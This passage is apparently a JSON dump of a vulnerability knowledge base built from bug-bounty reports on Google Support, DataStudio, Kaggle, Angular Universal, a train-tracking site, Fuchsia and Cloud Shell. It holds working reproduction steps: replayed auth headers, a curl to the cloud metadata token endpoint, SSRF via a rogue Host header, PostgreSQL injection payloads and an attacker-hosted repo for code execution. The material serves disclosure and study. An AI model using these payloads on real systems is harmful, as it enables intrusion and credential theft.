to\r\nhttps://support.google.com/apis/caseslist\r\n, which returns case IDs, summaries, and last updated timestamps. The root of the issue is that this API call returns internal case IDs as well as customer-facing ones.\r\nThis means a user is able to request an emailed copy of chat logs from these internal cases (if the participants used real-time chat functionality), even though they did not participate in them.\r\nPrerequisite:\r\nan open case with Google Support that an agent has chatted internally about. My support case was under Google Play and my agent contacted Play Tier 2 support about my issue. I'm afraid I can't provide reproduction steps for actions performed on internal systems, but I trust the team will be able to figure this part out. For reference, my case ID was\r\n3-1388000033001\r\nand the internal one was\r\n6-4560000033493\r\n.\r\nSteps to reproduce:\r\nOpen a debugging proxy (Burp Suite, Charles, etc.) and begin recording traffic.\r\nSign into Google and load the product page your support case is under on Google Help.\r\nObserve the \"Recent cases\" section appear under the \"Describe your issue\" search bar. Click \"Show more.\" It should have more than one -- any case with a message bubble icon to the left of it is vulnerable to this exploit.\r\nYour proxy should show a request to\r\nhttps://realtimesupport.clients6.google.com/v2/customers/me\r\n. Copy the\r\nX-Origin\r\n,\r\nAuthorization\r\n, and\r\nCookie\r\nheaders from this request.\r\nCompose a POST request of type\r\napplication/json\r\nto\r\nhttps://realtimesupport.clients6.google.com/v2/conversations:updateChatTranscriptEmailState?key=AIzaSyB5V4SIBGmrqREm7kf2fBJgPcBMCdUrLzE\r\n(the API Key is also from the previous request).\r\nPaste in the headers from earlier. In the body of the request, include a JSON object in the form of\r\n{\"caseId\": \"X-XXXXXXXXXXXXX\", \"sendChatTranscriptEmail\": true}\r\nwhere\r\ncaseId\r\nis the ID of one of the listed chat cases under \"Recent cases.\"\r\nSend the request.\r\nExpected behavior:\r\nThe server rejects the request saying the user does not have access (really, the case should not show on Google Help to begin with).\r\nActual behavior:\r\nThe server returns\r\n{\"chatTranscriptEmailState\": \"CHAT_TRANSCRIPT_EMAIL_REQUESTED\"}\r\nand the requesting user is emailed a transcript of the internal chat. (Subject line: \"Requested conversation copy.\")\r\nAttack scenario\r\nReceiving internal communications on the status of a support issue may be advantageous to a user who has been waiting, but really this is an information leak that concerns the privacy of support agents and the confidentiality of the company. This bug reveals the full name of the support agent who initiated the chat, and may also reveal confidential information about company policies and internal processes -- the transcript I received had an explicit warning against sharing any content meant for \"internal use only.\"", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3576, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "40e78730-9b1b-4692-8176-10c29d73a752": {"__data__": {"id_": "40e78730-9b1b-4692-8176-10c29d73a752", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.clean.txt", "file_name": "20250408_175728_764061.clean.txt", "file_type": "text/plain", "file_size": 798, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "09c17b06-50ed-432e-9de9-6f0cc2e7f266", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.clean.txt", "file_name": "20250408_175728_764061.clean.txt", "file_type": "text/plain", "file_size": 798, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a98ed44247cd3a18c70b0803bebcd2151a4cff8896085a4e9d64b3c417dd72ab", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Private report sharable link is leaked through referrer on DataStudio\r\nVideo proof:\r\nhttps://youtu.be/V7SBpi48Z3E\r\nSteps to reproduce:\r\nCreate a new report and create also a sharable link\r\nCreate any external link\r\nClick on the link.\r\nYou'll find the report url in the refer, like this one:\r\nhttps://datastudio.google.com/reporting/11mrjLgp2Es28443nB6U5c7b8vWNKDb2i/page/pDBz\r\nSimply drop the \"reporting\" part as well as the /page/pDBz, and replace it with /open/\r\nhttps://datastudio.google.com/open/11mrjLgp2Es28443nB6U5c7b8vWNKDb2i\r\nSharable link is leaked!\r\nBrowser/OS:\r\nAttack scenario:\r\nEveryone can exploit this vulnerability, listening for incoming request, saving the referral link and accessing to private data reports for any google datastudio user.\r\nWarnings shown:\r\nmusic_video", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 798, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "15a27b97-7ee0-4b90-858e-9172ad576c9d": {"__data__": {"id_": "15a27b97-7ee0-4b90-858e-9172ad576c9d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.clean.txt", "file_name": "20250408_175731_142983.clean.txt", "file_type": "text/plain", "file_size": 647, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cadbfe77-a339-47bb-ab5c-109fe72446a4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.clean.txt", "file_name": "20250408_175731_142983.clean.txt", "file_type": "text/plain", "file_size": 647, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "7aea4184bd4add506c840eafaff151e085914fe1d30bf515253194827c2f9d68", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Access Google Cloud Metadata on Kaggle Kernel\r\nSteps to reproduce:\r\nCreate a kernel on Kaggle.\r\nOn the right side, you can turn on Internet. Turn on it.\r\nCopy & Paste below code, and execute it.\r\n%%bash -e\r\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token\r\nAttack scenario:\r\nAny user in Kaggle can view the metadata of Google Cloud services. This can cause serious problems with Kaggle's services, including confidential information such as access token.\r\nAcquisition info:\r\nIt was March 2017.\r\nhttps://www.crunchbase.com/acquisition/google-acquires-kaggle--e769329b", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 647, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "03cda080-7826-4834-a202-7f40db974064": {"__data__": {"id_": "03cda080-7826-4834-a202-7f40db974064", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.clean.txt", "file_name": "20250408_175721_879397.clean.txt", "file_type": "text/plain", "file_size": 3329, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "39f1d7be-f5a2-494a-a4ce-a9c7ce1dcbaa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.clean.txt", "file_name": "20250408_175721_879397.clean.txt", "file_type": "text/plain", "file_size": 3329, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "251e039e1570142caecbdac086ddef512c8102c1be228f114152307929f8ad34", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Server Side Request Forgery\r\n(I already reported this issue and it is already fixed in this PR\r\nhttps://github.com/angular/angular/pull/39334\r\n. I was told to submit the original report to this program after that.)\r\nIf an Angular universal application which has\r\n@nguniversal/*-engine\r\npackage and enables\r\nuseAbsoluteUrl\r\noption, the following component is automatically vulnerable to SSRF(Server Side Request Forgery).\r\nexport class TestComponent implements OnInit {\r\nconstructor(private http: HttpClient) { }\r\nngOnInit() {\r\nconst result = this.http.get('/api/test')\r\n}\r\nDetail\r\nAs the document says \"You don't need to do anything to make relative URLs work on the server.\", relative URLs for HTTP requests in the server side rendering are automatically converted and work. I think we need the useAbsoluteUrl option to use this feature in the latest version of angular.\r\nhttps://angular.io/guide/universal#using-absolute-urls-for-http-data-requests-on-the-server\r\nWhen the server calls\r\nthis.http.get('/api/test')\r\n, the URL will be http://[HOST]/api/test and [HOST] comes from the request of HTTP client.\r\nTherefore, if the attacker changes Host header to localhost, the server sends the request to localhost and it may return internal secret content to the attacker. This is an SSRF.\r\nPoC app\r\nTo create a PoC app, I ran\r\nng new app\r\nand\r\nng add @nguniversal/express-engine\r\nand then added a few lines of codes. (I installed @angular/cli version 10.1.6)\r\nGenerated simple application is here.\r\nhttps://github.com/tyage/angular-unviersal-sample-app\r\nFollowing is the diff from auto-generated code. I guess it is simple and no one will expect there is a vulnerability.\r\nhttps://github.com/tyage/angular-unviersal-sample-app/commit/2121558fa980a8a319f10561e2e71a6b88cc4467\r\nThen, I started the server with\r\nnpm run build:ssr\r\nnpm run serve:ssr\r\n. I think this is a simple and standard way to create a universal angular application.\r\nAttack\r\nTo attack this server, I send an HTTP request with a modified Host header.\r\n$ curl localhost:4000 -H \"Host: mocos.kitchen:12345\"\r\nmocos.kitchen is my own server and it returns \"301 Moved Permanently\"\r\nHTTP/1.1 301 Moved Permanently\r\nLocation: https://api.thecatapi.com/v1/categories/\r\nThen, angular server fetches the contents of\r\nhttps://api.thecatapi.com/v1/categories/\r\nand injects it in the HTML. The attacker can change api.thecatapi.com to 169.254.169.254, which is a well-known SSRF target host in GCP or AWS since it returns credentials.\r\n<span _ngcontent-sc11=\"\">[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object] app is running!</span>\r\nI recommend to add note in the docs\r\nFurthermore, if the version of angular is 10.0.0-rc.0, it is automatically vulnerable to SSRF without the\r\noption.\r\nI also looked into a sample application and I think this code is potentially vulnerable to SSRF. (This app is safe until now since it use HttpClientInMemoryWebApiModule to \"simulate\" the server)\r\nhttps://github.com/angular/angular/blob/master/aio/content/examples/universal/src/app/hero.service.ts#L25\r\nBrowser/OS: Ubuntu 20.04, node.js v14.13.1\r\nAttack scenario:\r\noption, malicious attacker can exploit this vulnerability.\r\nThey might be able to fetch credentials from 169.254.169.254 or some other internal servers.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3329, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "27e36b2e-ad43-4f87-b620-42ef3224d165": {"__data__": {"id_": "27e36b2e-ad43-4f87-b620-42ef3224d165", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.clean.txt", "file_name": "20250408_175717_423436.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "38587683-fd88-4a06-b939-12ecc3292756", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.clean.txt", "file_name": "20250408_175717_423436.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "6a485d95d11223df8a0afa9ba90e964849112f2a0a416e4cd79a4bdb6bb0c6ac", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a6c0f852-9d77-4ff1-a0c4-cba7edca45ff": {"__data__": {"id_": "a6c0f852-9d77-4ff1-a0c4-cba7edca45ff", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.clean.txt", "file_name": "20250408_175726_524834.clean.txt", "file_type": "text/plain", "file_size": 1095, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b29dd12b-ac36-4849-a589-d982c69f2e54", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.clean.txt", "file_name": "20250408_175726_524834.clean.txt", "file_type": "text/plain", "file_size": 1095, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "0f2f161d3675e90fdfca2ab23e993f84ef872e616404fffafddae2365e1fcd77", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Sql Injection (parameter train_no) on subdomain (pre-prod.whereismytrain.in)\r\nSteps to reproduce:\r\nVisit the link\r\nhttps://pre-prod.whereismytrain.in/mt/submit_change_in_status\r\nwhich is the fourth on the list which is affected\r\nThe parameter is train_no is injectable with Error-Type Postgresql\r\nDetail of the injection to further test or reproduce is\r\nParameter: train_no (POST)\r\nType: error-based\r\nTitle: PostgreSQL AND error-based - WHERE or HAVING clause\r\nPayload: train_no=' AND 5178=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (5178=5178) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC) AND 'PdSo'='PdSo&train_date=\r\nBrowser/OS: Chrome/Firefox\r\nAttack scenario:\r\nThis subdomain can be reached by a good recon and the directories have to be brute-forced. The application and the owner straightaway looses first two pillars of CIA triad. By letting the application go vulnerable as well as attacker getting a chance to be handy with data.\r\nAcquisition info:\r\nIt was acquired in the 2k18 end acc to Crunchbase", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1095, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ad9a1d74-ac20-4905-a268-e282446dd4a2": {"__data__": {"id_": "ad9a1d74-ac20-4905-a268-e282446dd4a2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.clean.txt", "file_name": "20250408_175726_571908.clean.txt", "file_type": "text/plain", "file_size": 1514, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bce25272-be39-4144-8a0e-18bea5d0d26a", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.clean.txt", "file_name": "20250408_175726_571908.clean.txt", "file_type": "text/plain", "file_size": 1514, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c361faee2ffcac6a6e50b5241da7e2430b73e9bc0a39198fe32de2f1f31ed130", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: PostgreSQL- Error based & Time based & Stacked Queries\r\nSteps to reproduce:\r\nGo to url\r\nhttps://whereismytrain.in/mt/change_in_status\r\nSend a normal request on a proxy with train number and date, Intercept and inject your\r\nDate\r\nit would throw an error\r\nLeading to an injection\r\nFor your assistance the injection type ==> injection title ==> injection payload\r\nType: error-based\r\nTitle: PostgreSQL AND error-based - WHERE or HAVING clause\r\nPayload: train_no=12424&train_date=22-10-2019' AND 7869=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7869=7869) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC) AND 'WfdB'='WfdB\r\nType: stacked queries\r\nTitle: PostgreSQL > 8.1 stacked queries (comment)\r\nPayload: train_no=12424&train_date=22-10-2019';SELECT PG_SLEEP(5)--\r\nType: time-based blind\r\nTitle: PostgreSQL > 8.1 AND time-based blind\r\nPayload: train_no=12424&train_date=22-10-2019' AND 2413=(SELECT 2413 FROM PG_SLEEP(5)) AND 'KKpT'='KKpT\r\nBrowser/OS: Chromium/Firefox\r\nAttack scenario:\r\nA mere visitor to this application with an intention to damage the repo will enter the upgiven link capture the parameter and escalate it to making it a potential injection.\r\nThey gain the application's data as well as the application's code in some results. Even I am getting hard time to understand how come \"python\" is passing through the threads in the exploitation framework when you command --dump-all (SQLMap)\r\nAcquisition info:\r\nCrunchbase", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1514, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d0024ff1-3400-4ef4-b1b2-18ffa3645a83": {"__data__": {"id_": "d0024ff1-3400-4ef4-b1b2-18ffa3645a83", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e0bab84e-7eb7-4528-bb30-c221fa04943e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "196a3a89b76a42d09c219377e8445afa3218480037e7a34bbc20f96b38d02b40", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "32893812-9a19-437a-b858-f245cde8b1ac", "node_type": "1", "metadata": {}, "hash": "5749bb5ca38190d8265d5117bad37cdad151d9ff025a61ff419cb37b72fce6c0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nVulnerabilities in the algorithms used by Fuchsia/gVisor to populate network protocol header fields, specifically the TCP ISN, TCP timestamp, TCP and UDP source ports, and IPv4/IPv6 fragment ID\r\nProduct:\r\nFuchsia\r\nURL:\r\nhttps://cs.opensource.google/fuchsia/fuchsia\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nDear Google Fuchsia security Team\r\nThis is Amit Klein, a faculty member of the Hebrew University School of Computer Science and Engineering. I would like to report several security vulnerabilities in gVisor's network stack that we (Inon Kaplan - a PhD candidate in the Hebrew University, Ron Even - a BSc graduate from Bar Ilan University, and yours truly) found during our research. FYI, in parallel we are notifying the gVisor team about our findings, and we are also submitting this manuscript to a conference which will take place in early 2025.\r\nThe full report is attached as a PDF file.\r\nSome highlights:\r\nWe report multiple vulnerabilities in the algorithms used by Fuchsia/gVisor to populate network protocol header fields, specifically the TCP initial sequence number, TCP timestamp, TCP and UDP source ports, and IPv4/IPv6 fragment ID fields. Our attacks result in the exposure of a PRNG seed and a hashing key used to generate the above fields. This enables an attacker to predict future values of the fields, which facilitates several network attacks.\r\nThe paper focuses mostly on device tracking (against Fuchsia), but other attacks are also possible when the PRNG seed and the HashIV key are exposed:\r\nTCP initial sequence number prediction\r\nis a special case of a TCP sequence number prediction attack, which can be used to counterfeit TCP packets.\r\nIn general,\r\npredictable UDP source ports\r\ncan be exploited to mount an effective DNS cache poisoning attack. To be vulnerable to our attack, the DNS software has to use the underlying operating system to select UDP source ports (this is not the case with Fuchsia\u2019s stub DNS resolver. However, there may be other gVisor use cases in which this applies).\r\nTCP source port predictability\r\ncan expedite a TCP blind reset attack.\r\nOur attacks on TCP/IPv4 and the IPv4 ID disclose the device\u2019s\r\ninternal IP address\r\n, even if the device is behind a NAT. This violates the PCI DSS 4.0 Requirement 1.4.5.\r\nOur attack on the\r\nIPv4 ID generation algorithm\r\ncan be used to find IP addresses that collide (served from the same bucket) in the IPv4 ID table, which can be used to predict IPv4 ID values across these addresses. This in turn facilitates DNS cache poisoning attacks, traffic analysis attacks and TCP hijacking attacks.\r\nIn general, when a PRNG is used to generate sensitive data, having a\r\npredictable PRNG\r\nmay result in security vulnerabilities.\r\nOur main results are explained in sections III-VI of the paper. Section VII discusses our experiments with our PoC server and several Fuchsia devices over multiple networks. Section VIII discusses root causes and provides recommendations.\r\nWe also note that the Fuchsia NetStack3 implementation of TCP/UDP source port selection algorithm is vulnerable to a device tracking attack, as explained in Appendix A. NetStack3 is presently not the default stack in Fuchsia.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3205, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "32893812-9a19-437a-b858-f245cde8b1ac": {"__data__": {"id_": "32893812-9a19-437a-b858-f245cde8b1ac", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e0bab84e-7eb7-4528-bb30-c221fa04943e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "196a3a89b76a42d09c219377e8445afa3218480037e7a34bbc20f96b38d02b40", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "d0024ff1-3400-4ef4-b1b2-18ffa3645a83", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "70178de0b07d4f9ec7a4d55080af495da236481d5493ec726837e59ce4933db1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Our attack on the\r\nIPv4 ID generation algorithm\r\ncan be used to find IP addresses that collide (served from the same bucket) in the IPv4 ID table, which can be used to predict IPv4 ID values across these addresses. This in turn facilitates DNS cache poisoning attacks, traffic analysis attacks and TCP hijacking attacks.\r\nIn general, when a PRNG is used to generate sensitive data, having a\r\npredictable PRNG\r\nmay result in security vulnerabilities.\r\nOur main results are explained in sections III-VI of the paper. Section VII discusses our experiments with our PoC server and several Fuchsia devices over multiple networks. Section VIII discusses root causes and provides recommendations.\r\nWe also note that the Fuchsia NetStack3 implementation of TCP/UDP source port selection algorithm is vulnerable to a device tracking attack, as explained in Appendix A. NetStack3 is presently not the default stack in Fuchsia. The relevant file is\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:src/connectivity/network/netstack3/core/src/transport/tcp/socket/mod.rs\r\nFor your convenience, here is a list of relevant source code locations:\r\nGo PRNG advancement:\r\nhttps://github.com/golang/go/blob/master/src/math/rand/rng.go\r\nfunctions Int63 and Uint64\r\nGo PRNG seeding:\r\nfunction Seed\r\nSelection of Go\u2019s PRNG (math.rand):\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/stack/stack.go\r\nfunction New\r\nTCP Secrets initialization:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/protocol.go\r\nfunction NewProtocol\r\nJenkins One-at-a-time hash:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/hash/jenkins/jenkins.go\r\nfunctions Write and Sum32\r\nTCP ISN (offset):\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/connect.go\r\nfunction generateSecureISN\r\nTCP Timestamp (offset):\r\nfunction tsOffset\r\nTCP source port:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/ports/ports.go\r\nfunction PickEphemeralPortStable and\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/endpoint.go\r\nfunction registerEndpoint\r\nUDP source port:\r\nfunction PickEphemeralPort\r\nIPv4 ID:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/network/ipv4/ipv4.go\r\nfunction hashRoute\r\nIPv6 ID:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/network/ipv6/ipv6.go\r\nfunction handleFragments\r\nWe look forward to helping you address the vulnerabilities above in a timely manner. We can provide access to our PoC server if required. While we encourage you to provide a fix/patch ASAP, we do kindly ask you to keep the technical information and the nature of the attacks (except their attribution to us) confidential until we disclose them in a coordinated manner.\r\nAttack scenario\r\nThe attacks described in the paper can be mounted remotely, i.e. while a browser running in Fuchsia consumes an attacker web page.\r\nOur main scenario is a device tracking attack, wherein colluding (but unrelated, e.g. using no shared DNS/IP infrastructure) websites can track a Fuchsia device across networks, across time, across browser modes (regular/privacy), and across time. As a by product, our attacks also reveal the internal (private) IPv4 address of the device, even when it's behind a NAT.\r\nWe also describe how to predict UDP source ports, TCP source ports, TCP initial sequence numbers, and IP IDs. All these can be used subsequently for network attacks such as injecting TCP data to an existing connection.", "mimetype": "text/plain", "start_char_idx": 2289, "end_char_idx": 6152, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c7b43810-5275-4cee-881f-b5365fa1a8ea": {"__data__": {"id_": "c7b43810-5275-4cee-881f-b5365fa1a8ea", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.clean.txt", "file_name": "20250408_175728_661788.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "85c7d974-4f34-409d-9413-14876b261862", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.clean.txt", "file_name": "20250408_175728_661788.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5f787b46ba624dc9d72d69f179c0991f6f67cc80edef8bd3af1a673c214cde76", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: undocumented go_get_repo leads to code execution on cloudshell\r\nHey Google security team,\r\nIn the JS source code of cloudshell (\r\nhttps://www.gstatic.com/_/cloudshell/_/js/k=cloudshell.csh.nl.myP8e5tp8zw.O/d=1/rs=APXSEb_DWM6Igg927MPp712LbP5xcQR_Aw/m=cloudshell\r\n) i noticed an undocumented GET-parameter named 'go_get_repo'.\r\nAn attacker can abuse this parameter go gain code execution within the Cloudshell of the victim.\r\nSetting the go_get_repo GET parameter to \"go.offensi.com/go.html\" invokes the 'go get go.offensi.com/go.html' shell command within Cloudshell. By setting it to go.offensi.com/go.html i can force the go-client to read the metadata i provided. In go.offensi.com/go.html i'm specifying that my go files are being stored in a Mercurial/hg repo:\r\n\"<meta name=\"go-import\" content=\"go.offensi.com/go.html hg https://go.offensi.com/hgrepo/root\">\"\r\nThe malicious Mercurial repo on my server exploits a vulnerability in hg, which i discovered thanks to the use of Google Container Analysis running against a Cloudshell image i stored in gcr.io :) Debian 9 / Stretch is still vulnerable as can be seen here:\r\nhttps://security-tracker.debian.org/tracker/CVE-2019-3902\r\nSteps to reproduce:\r\nVictim opens\r\nhttps://ssh.cloud.google.com/cloudshell/editor?go_get_repo=go.offensi.com/go.html\r\nVictim clicks 'OK'\r\nCode is executed instantly  (the malicious 